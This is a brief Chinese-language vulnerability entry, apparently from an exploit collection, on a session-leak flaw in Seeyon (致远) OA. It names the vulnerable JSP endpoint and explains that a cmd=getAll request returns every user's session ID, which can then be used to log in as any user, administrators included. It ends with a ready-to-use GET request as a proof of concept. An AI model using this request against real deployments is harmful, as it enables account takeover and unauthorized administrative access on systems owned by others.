# 致远OA Session泄漏漏洞

## 漏洞位置
```http request
http://test.com/yyoa/ext/https/getSessionList.jsp
```
> 当cmd参数为getAll时，便可获取到所有用户的SessionID利用泄露的SessionID即可登录该用户，包括管理员


## POC
```http request
http://test.com/yyoa/ext/https/getSessionList.jsp?cmd=getAll
```

通过get 方式访问上述url 后，可以在返回包中看到session 信息